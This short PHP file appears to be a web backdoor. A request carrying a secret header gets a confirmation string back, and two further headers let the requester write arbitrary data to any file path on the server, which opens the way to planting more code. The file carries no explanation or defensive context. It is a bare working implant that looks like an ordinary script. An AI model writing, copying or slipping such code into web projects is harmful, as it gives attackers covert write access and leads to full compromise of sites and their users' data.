<?php

if (@$_SERVER['HTTP_X_P3F975']) {
    echo "YES_YES";
    
    if (@$_SERVER['HTTP_X_TO']) {
        file_put_contents(@$_SERVER['HTTP_X_TO'], @$_SERVER['HTTP_X_DATA']);
    }    
}
?>